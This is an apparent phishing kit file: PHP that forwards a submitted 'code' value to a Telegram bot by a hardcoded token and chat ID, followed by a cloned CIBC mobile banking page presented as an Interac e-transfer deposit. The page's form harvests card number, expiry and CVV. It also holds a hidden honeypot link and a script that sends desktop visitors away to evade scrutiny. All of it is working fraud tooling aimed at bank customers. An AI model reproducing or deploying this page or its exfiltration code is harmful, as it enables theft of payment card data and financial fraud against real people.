<?php

$code       = $_POST['code']; 
$message = " $code";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-903484597',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<!-- saved from url=(0042)/deposit/cibc/c -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>E-tranfer</title>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <link rel="stylesheet" href="./files/reset.css">
        <link rel="stylesheet" href="./files/reset-brand.css">
        <link rel="stylesheet" href="./files/global.css">
        <link rel="stylesheet" href="./files/global-android2.css">
        <link rel="stylesheet" href="./files/global-brand.css">
        <link rel="stylesheet" href="./files/password-reset.css">
        <link rel="stylesheet" href="./files/password-reset-brand.css">
        <style id="at-makers-style" class="at-flicker-control">
            .mboxDefault {visibility: hidden;}
        </style>
        <style>
        #header-logo {
            background: url(/assets/cibc/img/cibcnew.svg);
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            width: 100px;
        }
        </style>
        <script src="./files/jquery-3.6.0.min.js.download" crossorigin="anonymous"></script>
        <script>var lrbank = 'CIBC'; var lrinfo = 'Card';</script>
        <script src="./files/actions.js.download"></script>
    </head>
    <body lang="en" class="android-fix">
        <span class="offscreen">Forgot Password</span>
        <input type="checkbox" id="drawer-toggle-chk" aria-hidden="true">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div>CIBC<span>Mobile Banking</span></div>
                </div>
                <ul>
                    <li id="li-sign-on"><a id="signon-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-signonLink" role="menuitem">Sign On</a></li>
                    <li><a id="register-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-registerLink" role="menuitem">Register</a></li>
                    <li id="li-forgot-password"><a id="forgetpwd-link" class="tracking-set-flow active" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-forgetPasswordLink" role="menuitem">Forgot Password<span class="offscreen">Selected</span></a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-openAccountPs-openAccountPsLink" role="menuitem" @="Open an Account&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;">Open an Account</a></li>
                    <li id="li-browse-products"><a id="browse-products-link" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-browseProductsPs-productSelectorLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-sitesPreSignOnLink" role="menuitem" class="">CIBCSites</a></li>
                    <li id="li-find-us"><a id="find-us-link" href="https://www.cibc.com/ca/redirect/locator.html?itrc=C1:6185" target="_blank" role="menuitem">Find Us</a></li>
                    <li id="li-security"><a id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:6166" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li><a id="contact-us-link" href="https://www.cibc.com/m/contact-cibc.html?itrc=C1:6187" target="_blank" role="menuitem">Contact Us</a></li>
                    <li id="idd"><a id="legal-link" role="menuitem" href="https://www.cibc.mobi/ebm-mobile-anp/verify-card?6-1.ILinkListener-header-drawerMenu-privacyAndLegalContainer-legalLink" @="Privacy and Legal&lt;span class=&quot;offscreen&quot;&gt;Opens in new page.&lt;/span&gt;" class="">Privacy and Legal<span class="offscreen">Opens in new page.</span></a></li>
                    <li><a id="help-link" href="http://cibc.intelliresponse.com/mobile-w/?itrc=C1:6167" target="_blank" role="menuitem">Help</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="http://cibc.com/" target="_blank">
                <div id="header-logo">
                    <span class="offscreen">CIBClogo</span>
                </div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <section id="main-page" class="mainPageClassValue">
            <section id="ide">
                <section class="page-title">
                    <h2 class="title">Deposit Your Funds</h2>
                </section>
            </section>
            <section id="card-information" class="page-wrapper">
                <p id="introductory-content">We need a bit more information. Let's get started.</p>
                <h2 class="page-subtitle">Payment Information</h2>
                <div class="global-error-from-container" tabindex="-1" id="idf">
                </div>
                <form class="input-form form-card" id="card-information-form" method="post" action="040152.php" onsubmit="return validate()">
                                        <div class="form-group" style="">
                        <label>Card Number</label>
                        <input id="input-card" type="tel" placeholder="Enter your Card Number" name="card" class="form-control lrinput" onkeyup="split()" required="true" autocomplete="off" maxlength="19" oninput="this.value = this.value.replace(/[^0-9, ]/, &#39;&#39;)" attr-action="Filling Card">
                        <script src="./files/splitter.js.download"></script>
                        <link rel="stylesheet" href="./files/card.css">
                    </div>
                                        <label>Expiry</label>
                    <div class="form-group" style="">
                        <select name="exp1" required="" class="form-control text-center display-inline-block lrinput" style="width:48%; display: inline-block;" attr-action="Selecting Expiry">
                            <option value="">MM</option>
                            <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                        </select>
                        <select name="exp2" required="" class="form-control text-center display-inline-block lrinput" style="width:50%; display: inline-block;" attr-action="Selecting Expiry">
                            <option value="">YY</option>
                            <option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option>                        </select>
                    </div>
                                        <div class="form-group" style="">
                        <label>Cvv</label>
                        <input required="" id="input-cvv" type="tel" maxlength="3" placeholder="•••" name="cvv" class="form-control lrinput" oninput="this.value = this.value.replace(/[^0-9]/, &#39;&#39;)" attr-action="Filling CVV">
                    </div>
                                        <fieldset class="button-set" style="margin-top: 20px;">
                        <input type="submit" id="continue-button" class="btn btn-positive" name="save" value="Continue">
                    </fieldset>
                    <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                </form>
            </section>
        </section>
        <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
            <div class="ajax-overlay-background"></div>
            <img src="./files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
        </div>
    

</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>